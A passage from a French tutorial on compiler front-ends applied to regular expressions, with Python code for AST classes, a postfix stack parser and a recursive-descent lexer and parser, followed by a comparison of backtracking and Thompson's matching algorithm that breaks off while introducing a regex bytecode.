), et d'autre part à discerner les mots de nature différente, de la même manière que l'on distingue, dans une phrase en français, les ponctuations, les noms, les adjectifs ou les verbes. Notez que dans notre exemple, le symbole \"=\" n'est pas affecté à une classe particulière : sa classe est égale à sa valeur. L'utilisation de ce genre de singletons est justifiée : cela permet de rendre plus lisible le code qui le manipule. Alternativement, et parce que tous les analyseurs lexicaux ne supportent pas nécessairement ce genre de choses, on aurait tout aussi bien pu lui affecter la classe EQUALS . Pour continuer dans notre analogie avec le français, le flux de lexèmes est ensuite envoyé en entrée d'un analyseur syntaxique , chargé d'assembler les mots pour reconnaître des phrases. La forme des phrases acceptées par le langage est décrite par une grammaire constituée d'un certain nombre de règles . L'analyse syntaxique permet donc de détecter des constructions erronnées telles que \" a = + * /; 32 \", mais aussi de représenter celles-ci sous forme d'une structure arborescente, appelée arbre syntaxique (ou AST pour Abstract Syntax Tree ), qui décrit plus précisément leur forme. Par exemple, pour l'expression : a = 13 * 100 + 37 Un analyseur syntaxique pourrait produire l'arbre suivant : = / \\ / \\ a + / \\ / \\ * 37 / \\ / \\ 13 100 Remarquez en passant que l'AST tient bien compte des règles de priorité des opérateurs arithmétiques. Ici, la priorité de la multiplication sur l'addition. L'AST représentant le programme est ensuite soumis à une analyse sémantique qui peut éventuellement le modifier. Le rôle de celle-ci est de s'assurer que les phrases produites à l'étape précédente, qui sont syntaxiquement correctes , expriment quelque chose de sensé dans le langage, de la même manière que l'on peut vérifier qu'une phrase grammaticalement correcte en français veut effectivement dire quelque chose. Par exemple, la phrase \"J'ai dévissé le gâteau sous la voile du chat.\" est correctement formée du point de vue grammatical mais elle ne veut absolument rien dire. C'est durant l'analyse sémantique que sont vérifiées toutes les contraintes concernant le type des variables et des expressions, pour ne citer qu'elles. Le code suivant passera avec succès l'analyse lexicale d'un compilateur C, mais déclenchera une erreur de type lors de l'analyse sémantique puisqu'il essaye d'incrémenter une chaîne de caractères : char a[] = \"quarante\"; a += 2; Cette analyse dépend très fortement de la nature du langage qui est compilé. Par exemple, c'est à ce moment de la compilation que sera réalisée l' inférence de types ou le déroulement des expressions de filtrage par motifs ( pattern matching ) dans les langages fonctionnels dérivés de ML (OCaml, Haskell…), alors que les langages dynamiques tels que Python ou Javascript, beaucoup plus permissifs en comparaison, n'opéreront que très peu de vérifications ou de transformations sur l'AST. Dans certains cas, l'analyse sémantique peut même être absente : cela dépend entièrement des langages. Expressions rationnelles Les expressions rationnelles (ou expressions régulières ) permettent de décrire une certaine catégorie de langages que l'on appelle langages réguliers . En réalité, ces langages réguliers correspondent plus à une succession de motifs que l'on utilise couramment pour reconnaître ou valider le format d'un texte. L'expression $a$ désigne toutes les chaînes constituées uniquement du symbole a . Il faut différencier ici le langage décrit par une expression rationnelle des opérateurs de matching que vous avez peut-être l'habitude d'employer. Ainsi : a est une chaîne validée par l'expression $a$, b ne l'est pas, abcd non plus, aaa non plus. Les symboles élémentaires des expressions rationnelles sont évidemment des caractères. Il existe néanmoins un symbole spécial, $\\varepsilon$ ( epsilon ), qui désigne la chaîne vide. Passons maintenant aux opérateurs. L' union de deux langages, notée $\\mid$, désigne tous les motifs exprimés par l'un ou l'autre des langages. Par exemple : a est une chaîne validée par l'expression $a\\mid b\\mid\\varepsilon$, la chaîne vide ($\\varepsilon$) aussi, b aussi, ab ne l'est pas, c non plus. La concaténation de deux langages réguliers est elle-même un langage régulier. Ainsi : salut est acceptée par l'expression $salut$, compilation et compilateur le sont par $compilat(ion\\mid eur)$. Notez que ce dernier exemple illustre la priorité de la concaténation sur l'union, ainsi que la distributivité de la concaténation par rapport à l'union : $$a(b\\mid c) = ab \\mid ac$$ $$(a\\mid b)c = ac\\mid bc$$ Enfin, la fermeture de Kleene d'une expression $X$, notée $X\\ast$, désigne le plus petit langage qui contienne $X$ et $\\varepsilon$ et qui soit stable par la concaténation. En termes moins obscurs : $a\\ast$ désigne les chaînes $\\varepsilon$, a , aaa , etc., $(a\\mid b\\mid c)\\ast$ désigne tous les mots constitués des symboles $a$, $b$ et $c$ ( bac , cab , baba , abcccabcbab , etc.). La fermeture est l'opérateur qui a la priorité la plus forte. Ainsi, si nous classons les trois opérateurs par ordre de priorité croissante, nous avons : L'union, La concaténation, La fermeture. Plutôt que nous attarder plus longtemps sur les propriétés mathématiques des expressions rationnelles que nous aurons l'occasion de découvrir au fil de cet article, nous allons maintenant passer à la pratique en écrivant quelques programmes permettant de jouer avec. Mais avant cela, remarquons que les expressions régulières que nous avons l'habitude de manipuler ne comprennent pas de symbole $\\varepsilon$. En fait, l'absence de ce symbole peut être facilement compensée par l'ajout d'un opérateur $?$ tel que, pour toute expression régulière $X$ : $$X? = X\\mid\\varepsilon$$ Tant que nous y sommes, offrons-nous également l'opérateur $+$ tel que pour toute expression régulière $X$ : $$X+ = XX\\ast$$ Ces deux opérateurs ont la même priorité que la fermeture ($\\ast$). Analyse lexicale et syntaxique d'expressions rationnelles Arbres syntaxiques abstraits Pour démarrer, nous allons représenter les expressions régulières sous la forme de structures arborescentes (nos arbres syntaxiques abstraits, ou AST). Nous les implémenterons en Python. Le but de ce premier programme est uniquement d'afficher une expression régulière dans la console en fonction de son AST, comme ceci : regex = cat ( union ( char ( 'a' ), char ( 'b' )), option ( char ( 'c' ))) print ( regex ) # affiche (a|b)c? Commençons par créer trois classes, pour les trois types de noeuds de nos AST, à savoir les symboles, les opérateurs unaires ($?$, $\\ast$, $+$) et les opérateurs binaires (l'union $\\mid$ et la concaténation). CAT = '' UNION = '|' CLOSURE = '*' OPTION = '?' REPEAT = '+' class Char : def __init__ ( self , val ): self . val = val class Unop : def __init__ ( self , op , arg ): self . op = op self . arg = arg class Binop : def __init__ ( self , op , left , right ): self . op = op self . left = left self . right = right char = Char option = lambda x : Unop ( OPTION , x ) closure = lambda x : Unop ( CLOSURE , x ) repeat = lambda x : Unop ( REPEAT , x ) union = lambda a , b : Binop ( UNION , a , b ) cat = lambda a , b : Binop ( CAT , a , b ) Maintenant, nous pouvons surcharger leurs méthodes __str__ de manière à les afficher sous la forme que nous connaissons. La seule subtilité de ce code est le placement des parenthèses : si un nœud correspond à une opération de priorité inférieure à celle de son nœud père, alors la chaîne de caractères produite doit être parenthésée. Voici une façon d'implémenter ceci : # Operator precedences prec = { UNION : 1 , CAT : 2 , CLOSURE : 3 , REPEAT : 3 , OPTION : 3 , } class Char : def __init__ ( self , val ): self . prec = 4 self . val = val def __str__ ( self ): return self . val class Unop : def __init__ ( self , op , arg ): self . op = op self . prec = prec [ op ] self . arg = arg def __str__ ( self ): arg = str ( self . arg ) if self . arg . prec < self . prec : arg = \"( %s )\" % arg return arg + self . op class Binop : def __init__ ( self , op , left , right ): self . op = op self . prec = prec [ op ] self . left = left self . right = right def __str__ ( self ): left , right = str ( self . left ), str ( self . right ) if self . left . prec < self . prec : left = \"( %s )\" % left if self . right . prec < self . prec : right = \"( %s )\" % right return left + self . op + right Notation post-fixée et parseur à pile Avant de nous lancer dans le parsing définitif de nos expressions rationnelles, examinons au passage une forme de notation commode pour décrire un arbre : la notation post-fixée. Celle-ci permet d'écrire n'importe quelle expression de manière non ambiguë sans avoir à utiliser de parenthèses ni gérer la priorité des opérateurs, puisque chaque opérateur est placé après ses opérandes. Par commodité, nous noterons \".\" l'opérateur de concaténation. ab. désigne le langage $ab$, l'expression d?ab.c|.+ désigne le langage $(d?(ab\\mid c))+$ Si cette notation demande une certaine gymnastique mentale pour être lue, elle n'en est pas moins facile à parser . En effet, il suffit pour cela d'utiliser une pile en lisant l'expression de gauche à droite et de réaliser les opérations suivantes pour chaque symbole : Si le symbole courant est un caractère, on empile simplement le nœud char correspondant, Si c'est un opérateur unaire, on dépile le dernier élément, on crée le nœud correspondant à l'opération, et on empile ce nouveau nœud, Si c'est un opérateur binaire, on dépile les deux derniers éléments, et on empile le nœud correspondant à l'opération. Cela s'implémente de façon très naturelle : def from_postfix ( input_str ): unops = { '*' : closure , '+' : repeat , '?' : option } binops = { '.' : cat , '|' : union , } stack = [] for c in input_str : if c in binops : right , left = stack . pop (), stack . pop () stack . append ( binops [ c ]( left , right )) elif c in unops : arg = stack . pop () stack . append ( unops [ c ]( arg )) else : stack . append ( char ( c )) return stack . pop () if __name__ == '__main__' : while True : try : print ( from_postfix ( input ( '>>> ' ))) except IndexError : print ( \"[ERROR] malformed expression\" ) except KeyboardInterrupt : break Il est important de remarquer que cette fonction ne gère pas finement les erreurs lorsque la pile est vide. En toute rigueur nous devrions donner au minimum à l'utilisateur une indication sur l'opération qui fait planter le parseur afin qu'il sache où il doit corriger son expression, et nous devrions aussi afficher un warning lorsque la pile n'est pas vide à la fin de la conversion. Toutefois, ce parseur n'étant pas une finalité pour nous, nous ne nous inquiéterons des mécanismes de rapports d'erreurs que plus loin dans cet article. Voici un exemple d'exécution dans la console : >>> co.m.p.i.l.a.t.io.n.eu.r.|. compilat(ion|eur) >>> compilat.......ion..eur..|. compilat(ion|eur) >>> d?ab.c|.* (d?(ab|c))* >>> abc... [ERROR] malformed expression Notez dans l'exemple que plusieurs expressions postfixées donnent la même expression rationnelle. En fait, seuls les arbres syntaxiques vont différer. Si l'on prend par exemple les expressions ab.c. et abc.. nous aurons les deux arbres syntaxiques équivalents suivants : ab.c. : . / \\ . c / \\ a b abc.. : . / \\ a . / \\ b c Ceci est dû à la propriété d'associativité de la concaténation : $$a(bc) = (ab)c = abc$$ L'union possède la même propriété : $$a\\mid\\left(b\\mid c\\right) = \\left(a\\mid b\\right)\\mid c = a\\mid b\\mid c$$ Notation infixe et grammaires non contextuelles Pour reconnaître des expressions régulières dans leur forme infixe, nous allons devoir nous attarder quelques instants sur la notion de grammaire non contextuelle (ou juste grammaire ). Une grammaire est une notation permettant de décrire la syntaxe d'un langage au moyen de règles , et ainsi de structurer la partie frontale d'un compilateur. Une grammaire non contextuelle comporte quatre types d'éléments : Les symboles terminaux , qui sont les symboles élémentaires du langage décrit par la grammaire. On les appelle aussi des unités lexicales . Dans un compilateur, les terminaux sont bien souvent les types associés aux lexèmes qui sortent de l'analyseur lexical. Les non-terminaux représentent des chaînes de terminaux, comme nous allons le voir dans un instant. Les productions ou règles de la grammaire. Une règle décrit une façon possible d'écrire une construction du langage. Chaque règle est associée à un non-terminal, et chaque non-terminal peut être défini par une ou plusieurs règles. L' axiome , ou symbole de départ de la grammaire, est le non-terminal d'où sont créées toutes les constructions du langage. Par convention, c'est généralement le non-terminal exprimé par la toute première règle de la grammaire. Prenons la grammaire suivante comme exemple. La syntaxe employée est la Forme de Backus-Naur (ou BNF ) : somme ::= somme '+' nombre somme ::= somme '-' nombre somme ::= nombre nombre ::= '0' | '1' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9' Cette grammaire définit la forme d'une somme ne comprenant que des entiers naturels inférieurs à 10. Elle comporte : Deux non-terminaux : somme et nombre , Quatre règles pour définir ces deux non-terminaux, Douze terminaux : '+' , '-' , '0' , '1' , …, '9' , Son axiome est le non-terminal somme . Pour rendre sa lecture plus aisée, nous pouvons récrire cette grammaire comme ceci : somme ::= somme '+' nombre | somme '-' nombre | nombre nombre ::= '0' .. '9' Les productions suivantes sont acceptées par cette grammaire : 4 1 - 2 + 5 - 9 5 + 7 + 2 + 1 - 0 L'analyse syntaxique consiste à essayer de dériver les règles de la grammaire pour décrire la façon dont est structurée la chaîne d'entrée. Par exemple, la chaîne \"1 - 2 + 3 - 4\" correspond à la dérivation suivante : somme / | \\ somme '-' nombre / | \\ \\ somme '+' nombre '4' / | \\ \\ somme '-' nombre '3' | \\ nombre '2' | '1' Remarquons que cela signifie que l'expression a été parsée comme ceci : ((((1) - 2) + 3) - 4) Ainsi, dans cette grammaire, les opérateurs + et - sont associatifs à gauche. Ceci est dû au fait que le non-terminal somme est dit récursif à gauche puisque certaines de ses productions commencent par lui-même. La récursion s'établit alors à gauche de l'opérateur, ou bien à l'extrémité gauche de la production. Si nous voulions rendre nos opérateurs associatifs à droite, il aurait fallu écrire cette grammaire avec des productions récursives à droite pour le non-terminal somme , comme ceci : somme ::= nombre '+' somme | nombre '-' somme | nombre nombre ::= '0' .. '9' Ce qui donne, pour la chaîne \"1 - 2 + 3 - 4\" la dérivation suivante : somme / | \\ nombre '-' somme / / | \\ '1' nombre '+' somme / / | \\ '2' nombre '-' somme / | '3' nombre | '4' Sur des considérations plus pratiques, il faut remarquer que les productions récursives à gauche peuvent engendrer une boucle infinie dans certains analyseurs syntaxiques (en particulier celui que nous nous apprêtons à écrire), ce qui n'est pas le cas des productions récursives à droite puisqu'elles consomment généralement des entrées avant de boucler. Cela dit, que ce soit via une récursion à droite ou à gauche ces grammaires ont le mérite de ne pas être ambiguës, contrairement à celle-ci dont il est impossible, faute de plus d'informations, de déduire l'associativité de l'opérateur + : somme ::= somme '+' somme | nombre nombre ::= '0' .. '9' Outre l'associativité, la façon dont on formule une grammaire influence également la priorité des opérateurs. Par exemple, on pourrait être tentés d'écrire la règle suivante : expr ::= nombre '+' expr | nombre '*' expr | nombre Malheureusement, celle-ci n'aura probablement pas l'effet escompté sur la chaîne \"3 * 4 + 5\" : expr / | \\ nombre '*' expr / / | \\ '3' nombre '+' expr | | '4' nombre | '5' Cela signifie que la chaîne \"3 * 4 + 5\" donne, après analyse, l'expression 3 * (4 + 5) , ce qui n'est pas du tout le comportement attendu. Une façon simple et naturelle de régler ce problème est de passer par une règle intermédiaire : somme ::= produit '+' somme | produit produit ::= nombre '*' produit | nombre nombre ::= '0' .. '9' Cette fois-ci, la priorité de la multiplication sur l'addition est respectée : \"3 * 4 + 5\" somme / | \\ produit '+' somme / | \\ \\ nombre '*' produit produit | | | '3' nombre nombre | | '4' '5' L'étude des différents types de parseurs et des classes de grammaires qu'ils supportent dépasse d'assez loin le cadre de cet article. En fait, elle pourrait faire l'objet d'un article entier. Ici, nous nous contenterons d'évoquer le fait que le parseur que nous allons écrire parcourt sa grammaire par descente récursive : on parle d'approche top-down , contrairement aux parseurs créés automatiquement par des générateurs d'analyseurs syntaxiques tels que Yacc, qui implémentent plutôt un algorithme de décalage/réduction ( shift-reduce ), ce qui correspond à une approche bottom-up . Pour l'heure, nous connaissons suffisamment de théorie pour formuler une grammaire des expressions régulières. Il suffit pour cela de formuler les règles en traitant les opérations par ordre de priorité croissante, et en prenant bien soin d'éviter les productions récursives à gauche : expr ::= cat '|' expr | cat cat ::= unop cat | unop unop ::= operand '*' | operand '?' | operand '+' | operand % Le terminal CHAR désigne un caractère quelconque operand ::= CHAR | '(' expr ')' Le lecteur observateur aura remarqué que cette grammaire interdit de chaîner les opérations unaires en écrivant quelque chose comme a+? . À vrai dire, cela n'est pas une véritable limitation puisqu'aucune combinaison d'opérations unaires n'aurait de sens. Il est donc préférable de ne pas les prévoir dans notre grammaire : si l'utilisateur formule une telle combinaison, il vaut mieux attirer son attention dessus au moyen d'une erreur plutôt que de faire une contorsion pour la compiler. Si c'est vraiment ce qu'il veut faire, rien ne l'empêchera de forcer le compilateur en écrivant quelque chose comme \"(a+)?\" . Un lexeur et un parseur simples L'écriture de l'analyseur lexical (ou lexeur ) n'est pas compliquée, il suffit de spécifier clairement, à l'avance, les unités lexicales que celui-ci utilise. Dans notre cas, seuls les caractères seront regroupés sous un label commun. Tous les autres symboles du langage seront des singletons : # Caractères ('CHAR', 'a') ('CHAR', 'b') ... # Opérateurs unaires ('*', '*') ('+', '+') ('?', '?') # Union ('|', '|') Nous allons définir une classe Lexer dotée des deux méthodes suivantes : La méthode token() consomme une partie de l'entrée et retourne le lexème (ou token ) courant. La méthode peek() ne consomme pas d'entrée, elle retourne simplement le prochain lexème à venir. C'est ce que l'on appelle l'opérateur de pré-vision . Lorsqu'il n'y a plus de caractères d'entrée à consommer, ces deux méthodes retournent le singleton None . class Lexer : def __init__ ( self , input_str ): self . it = iter ( input_str ) self . buf = None def token ( self ): if self . buf : token , self . buf = self . buf , None return token token = None try : token = next ( self . it ) if token in \"*|()+?\" : token = ( token , token ) elif token == ' \\\\ ' : # '\\' introduces an escape sequence token = ( 'CHAR' , next ( self . it )) else : token = ( 'CHAR' , token ) except StopIteration : pass return token def peek ( self ): if not self . buf : self . buf = self . token () return self . buf Notez que l'on autorise l'utilisateur à échapper certains caractères : si son expression contient le caractère '+' , il peut l'échapper en écrivant '\\+' . Pour rester cohérents, nous allons donc modifier légèrement la méthode __str__ de la classe Char : class Char : def __init__ ( self , val ): self . prec = 4 self . val = val def __str__ ( self ): s = self . val if s in \"()?*+|\" : s = \" \\\\ \" + s return s Jusqu'ici, aucune difficulté. Passons maintenant à l'écriture du parseur. Voici le squelette de la classe Parser : class ParseError ( Exception ): pass class Parser : def __init__ ( self , lexer ): self . lexer = lexer def p_expr ( self ): ''' expr ::= cat '|' expr | cat ''' def p_cat ( self ): ''' cat ::= unop cat | unop ''' def p_unop ( self ): ''' unop ::= operand '?' | operand '*' | operand '+' | operand ''' def p_operand ( self ): ''' operand ::= '(' expr ')' | CHAR ''' Nous nous sommes ici contentés d'écrire une méthode par non-terminal de notre grammaire, et de rappeler les règles de production en commentaire de chaque méthode. Ceci est une bonne pratique à adopter pour ne pas perdre la vue générale de la grammaire du langage lorsque l'on est plongé dans l'implémentation des règles de production. L'idée de base pour implémenter ces méthodes est d'en parcourir les productions comme ceci : Pour parser un non-terminal : appeler la méthode correspondante qui retournera son AST et continuer le parsing. Pour parser un terminal : examiner le prochain token . S'il correspond au prochain terminal d'une règle de production, consommer ce token et continuer le parsing. Sinon, c'est que l'expression est mal formée, donc il faut retourner une erreur à l'utilisateur. Une fois arrivé à la fin d'une production, générer et retourner l'AST correspondant. On dit alors que la règle est réduite . Cependant, ce principe de base ne suffira pas à éliminer tous les cas d'erreur. En particulier, il ne nous permettra pas de parser élégamment le non-terminal cat , puisqu'aucune de ses productions ne contient de symbole terminal. Pour pallier ce problème et implémenter un mécanisme de détection d'erreurs robuste, nous allons employer une méthode bien connue des générateurs d'analyseurs lexicaux, en déterminant pour chaque non-terminal l'ensemble $Premier$ des terminaux par lesquels il peut commencer, ainsi que l'ensemble $Suivant$ des terminaux qui peuvent le suivre. Commençons par les ensembles $Premier$. Et pour cela parcourons notre grammaire du bas vers le haut. Un non-terminal operand peut démarrer soit par un lexème '(' , soit par un 'CHAR' . D'où : first = { 'operand' : [ '(' , 'CHAR' ], } Un non-terminal unop démarre nécessairement par un non-terminal operand , donc son ensemble $Premier$ sera celui d' operand . De même, un cat démarre nécessairement par un unop et une expression démarre nécessairement par un cat . Ainsi, tous les non-terminaux de notre grammaire ont le même ensemble $Premier$ : class Parser : #... first = { 'operand' : [ 'CHAR' , '(' ], 'unop' : [ 'CHAR' , '(' ], 'cat' : [ 'CHAR' , '(' ], 'expr' : [ 'CHAR' , '(' ] } def begins ( self , nonterminal ): tok = self . lexer . peek () term = tok [ 0 ] if tok else None return term in self . first [ nonterminal ] #... La méthode begins sert simplement à vérifier que le non-terminal passé en argument peut démarrer sur le prochain token. Pour l'ensemble $Suivant$, il faut parcourir la grammaire de haut en bas et examiner pour chaque non-terminal les terminaux qui le suivent dans toutes les productions de la grammaire. Une expr peut être suivie : Soit de la fin du flux (on utilisera pour ce faire le singleton None ), Soit, dans la production d'un operand , d'une parenthèse fermante. Ainsi : following = { 'expr' : [ ')' , None ], } Le non-terminal cat peut conclure une expr donc son ensemble $Suivant$ contiendra celui de expr . Un cat peut également servir d'opérande gauche dans une union, donc être suivi par un '|' , d'où : following = { 'expr' : [ ')' , None ], 'cat' : [ '|' , ')' , None ], } C'est là que cela devient intéressant : un unop , dans les règles de production de cat , peut être suivi par un cat . Cela signifie que l'ensemble $Suivant$ de unop contient l'ensemble $Premier$ de cat . Il peut être également le non-terminal par lequel se termine un cat , donc son ensemble $Suivant$ contient également l'ensemble $Suivant$ de cat : following = { 'expr' : [ ')' , None ], 'cat' : [ '|' , ')' , None ], 'unop' : [ 'CHAR' , '(' , '|' , ')' , None ], } Enfin, un operand peut être suivi de l'un des trois opérateurs unaires dans les règles de production du non-terminal unop , d'où : class Parser : # ... following = { 'expr' : [ ')' , None ], 'cat' : [ '|' , ')' , None ], 'unop' : [ 'CHAR' , '(' , '|' , ')' , None ], 'operand' : [ '?' , '*' , '+' , 'CHAR' , '(' , '|' , ')' , None ], } def error ( self , current_token , token_list ): s = 'end of input' if current_token : s = \"' %s '\" % current_token [ 1 ] raise ParseError ( \"Found %s . Expecting one of %s \" % ( s , repr ( token_list ))) def check_ends ( self , nonterminal ): tok = self . lexer . peek () term = tok [ 0 ] if tok else None if term not in self . following [ nonterminal ]: self . error ( tok , self . following [ nonterminal ]) # ... Nous nous sommes dotés au passage d'une méthode que nous appellerons après avoir fini de parser une production, et qui lèvera une exception si le token suivant dans le flux d'entrée est incohérent avec le non-terminal que nous venons de réduire. Munis de ces méthodes, nous pouvons aborder sereinement l'implémentation de nos méthodes de parsing qui, pour le coup, est devenue triviale : class Parser : # ... def parse ( self ): ast = self . p_expr () if self . lexer . peek (): raise ParseError ( \"Unbalanced ')'\" ) return ast def p_expr ( self ): ''' expr ::= cat '|' expr | cat ''' ast = self . p_cat () tok = self . lexer . peek () if tok and tok [ 0 ] == '|' : self . lexer . token () ast = union ( ast , self . p_expr ()) self . check_ends ( 'expr' ) return ast def p_cat ( self ): ''' cat ::= unop cat | unop ''' ast = self . p_unop () if self . begins ( 'cat' ): ast = cat ( ast , self . p_cat ()) self . check_ends ( 'cat' ) return ast def p_unop ( self ): ''' unop ::= operand '?' | operand '*' | operand '+' | operand ''' ast = self . p_operand () tok = self . lexer . peek () if tok : if tok [ 0 ] == '?' : self . lexer . token () ast = option ( ast ) elif tok [ 0 ] == '*' : self . lexer . token () ast = closure ( ast ) elif tok [ 0 ] == '+' : self . lexer . token () ast = repeat ( ast ) self . check_ends ( 'unop' ) return ast def p_operand ( self ): ''' operand ::= '(' expr ')' | CHAR ''' tok = self . lexer . peek () if not tok : self . error ( tok , self . first [ 'operand' ]) ast = None if tok [ 0 ] == '(' : self . lexer . token () # consume '(' ast = self . p_expr () # parse expr if not self . lexer . token (): # consume ')' raise ParseError ( \"Unbalanced '('\" ) elif tok [ 0 ] == 'CHAR' : self . lexer . token () ast = char ( tok [ 1 ]) else : self . error ( tok , self . first [ 'operand' ]) self . check_ends ( 'operand' ) return ast Il ne nous reste plus qu'à tester ce code en réalisant une petite REPL qui parse chaque ligne comme une expression régulière : if __name__ == '__main__' : while True : try : instr = input ( '>>> ' ) print ( Parser ( Lexer ( instr )) . parse ()) except ParseError as e : print ( \"[ERROR] %s \" % e ) except KeyboardInterrupt : break Nous pouvons vérifier que tout fonctionne bien dans la console : >>> (a|b)* (a|b)* >>> (((a|b)))* (a|b)* >>> \\e\\c\\h\\a\\p\\p\\e\\m\\e\\n\\t\\? echappement\\? >>> a*+ [ERROR] Found '+'. Expecting one of ['CHAR', '(', '|', ')', None] >>> (a*)+ a*+ >>> (ab(c|d)e [ERROR] Unbalanced '(' >>> ab(c|d)e)* [ERROR] Unbalanced ')' >>> Nous avons maintenant un parseur d'expressions régulières plutôt propre, qui nous sort des erreurs verbeuses. Nous pourrions encore améliorer ces erreurs en essayant d'obtenir quelque chose comme : >>> a*+(b|c)? [ERROR] Found '+' while expecting character, '(', '|', ')' or end of input. Here: a*+(b|c)? &#94; Ceci est plutôt facile à réaliser : il suffit que les tokens produits par le lexeur embarquent leur position dans la chaîne d'entrée, ce qui permettrait à la fonction d'erreur de générer cet indice visuel. L'implémentation de ce mécanisme d'erreurs est laissé au lecteur en guise d'exercice. Évaluation d'expressions rationnelles Lorsque Kleene a créé les expressions régulières dans les années 1950, ce n'était pas pour l'application pratique que l'on leur connaît aujourd'hui. À l'origine, il s'agissait simplement d'une notation pour décrire les langages réguliers, dont il a enrichi la modélisation de l'activité neuronale par automates finis que McCulloch et Pitts avaient formulée dix ans plus tôt dans un article précurseur des réseaux de neurones formels. De ce fait, les expressions régulières sont intrinsèquement liées au concept de machine à états , puisqu'elles en sont une représentation formelle. Prenons par exemple l'expression rationnelle $a(bc\\mid bb)d$. Celle-ci peut être représentée par l'automate suivant : +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Confronter une chaîne de caractères à une expression régulière revient à parcourir l'automate associé, jusqu'à ce que l'entrée ne corresponde plus à aucun état possible de ce dernier (ce qui correspond à un échec de la reconnaissance), ou bien que l'on tombe sur l'état final ( [MATCH] ) qui indique que l'entrée est validée. Intuitivement, on peut imaginer deux méthodes pour parcourir cet automate. La première de ces méthodes est couramment employée dans de très nombreux logiciels ( grep , sed , PCRE …) et langages de programmation (Perl, Python, Ruby, Java…) : il s'agit du backtracking . Algorithme de backtracking Si l'on soumet la chaîne abbd à l'automate précédent, la stratégie de backtracking reviendrait à effectuer les opérations suivantes. Initialement, l'automate se trouverait positionné comme ceci (le symbole $\\ast$ représente la position courante) : position: .a b b d +---->(b)--->(c)----+ * / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Le premier symbole de la chaîne ( a ) serait consommé. Celui-ci correspond au caractère porté par l'état initial (a) . Étant donné que plusieurs transitions partent de cet état, le programme doit en choisir une et garder en mémoire le chemin qu'il a pris : position: a.b b d * +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Le second symbole ( b ) correspondant à l'état (b) courant, le programme avancerait encore d'un cran : position: a b.b d * +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Le symbole suivant, b , ne correspond pas à celui attendu par l'état (c) . C'est ici qu'intervient le backtracking . Le programme va revenir sur ses pas jusqu'au dernier embranchement qu'il a pris, et reculer d'autant de caractères dans la chaîne d'entrée : position: a.b b d +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ * / +---->(b)--->(b)----+ À partir de cet instant, tous les caractères de la chaîne vont correspondre aux états de l'automate. La chaîne va donc être entièrement parcourue jusqu'à ce que le programme arrive à l'étape finale : position: a b b d. +---->(b)--->(c)----+ / \\ * -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Ici, on vérifie que la chaîne ne contient plus aucun caractère : c'est le cas. Le programme se termine donc avec succès. Cette méthode naïve permet aux moteurs qui l'utilisent de proposer en plus du simple matching un certain nombre de features plus complexes, comme par exemple les opérateurs de lookahead et lookbehind que l'on retrouve dans les PCRE, et qui servent à exprimer plus simplement certains motifs. Néanmoins, cette stratégie peut nécessiter dans certains cas pathologiques de revenir en arrière un très grand nombre de fois. En fait, on peut montrer que sur certaines expressions pathologiques, le match est réalisé avec une complexité exponentielle en $O(2&#94;n)$. Dans cet article, nous prenons le parti de nous détacher de cette méthode qui, comparativement à celle que nous allons voir tout de suite, n'a qu'un intérêt limité en termes pédagogiques et algorithmiques. Algorithme de Thompson Une seconde méthode d'évaluation des expressions rationnelles, formulée en 1968 par Thompson, consiste à parcourir la machine à états d'une expression régulière en maintenant plusieurs états simultanés à la fois —donc en considérant ouvertement celle-ci comme un Automate Fini Non déterministe (AFN)— quitte à mémoriser des ensembles d'états dans un cache —de façon à transformer incrémentalement cet AFN en un Automate Fini Déterministe (AFD)—. Nous reviendrons sur les notions d'AFN et d'AFD plus loin dans cet article. Pour l'heure, examinons la façon dont l'algorithme de Thompson parcourt les expressions régulières. Reprenons l'état initial que nous avons vu plus haut : position: .a b b d +---->(b)--->(c)----+ * / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ À la différence de l'algorithme de backtracking , une fois le a validé par l'état (a) de l'automate, nous n'allons pas choisir une transition quitte à revenir en arrière, mais plutôt examiner les deux possibilités simultanément . Ainsi, l'état suivant se caractériserait par deux positions courantes (deux threads , au sens formel) : position: a.b b d *T1 +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ *T2 / +---->(b)--->(b)----+ Lorsque nous allons consommer le caractère suivant, b , nous nous apercevrons que celui-ci correspond à la fois à l'état courant du thread T1 et à celui du thread T2 . Nous faisons donc avancer les deux threads d'un cran : position: a b.b d *T1 +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ *T2 / +---->(b)--->(b)----+ Ici, T1 s'attend à voir arriver un c alors que le prochain caractère est un b . T1 est alors détruit, ne laissant plus que T2 en lice : position: a b b.d +---->(b)--->(c)----+ / \\ *T2 -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Nous connaissons la fin de l'exécution : T2 va arriver au bout de l'automate et valider la chaîne. Par rapport à la stratégie du backtracking , nous n'avons pas réalisé moins de comparaisons de caractères, cependant nous n'avons parcouru notre chaîne d'entrée qu'une seule fois, en une seule passe, et nous n'avons pas eu besoin de mémoriser le chemin que nous avons parcouru. Cette stratégie, quoique moins efficace dans le cas nominal, est plus stable que l'algorithme de backtracking : l'évaluation d'une chaîne de caractères se fera toujours en $O(n)$. Cet algorithme est utilisé en particulier dans l'utilitaire grep de la distribution Unix Plan 9 . Représentation intermédiaire et algorithme de McNaughton-Yamada-Thompson Plutôt que représenter directement nos expressions régulières par des structures Etat qui pointent les unes sur les autres, nous allons passer par une représentation intermédiaire sur laquelle il est plus facile de raisonner. En fait, il est possible de traduire directement un AFN tel que ceux que nous avons vu dans la section précédente en un bytecode très simple composé uniquement de quatre instructions. Commençons par en voir un exemple pour l'expression $a(bc\\mid bb)d$ : Automate: +---->(b)--->(c)----+ / \\ -->(a) +-->(d)--->[MATCH] \\ / +---->(b)--->(b)----+ Bytecode: 1:CHAR 'a' 2:SPLIT 6 3:CHAR 'b' 4:CHAR 'c' 5:JMP 8 6:CHAR 'b' 7:CHAR 'b' 8:CHAR 'd' 9:SUCCESS Chaque instruction du bytecode est précédée d'un numéro de ligne, son adresse . La machine virtuelle qui exécutera 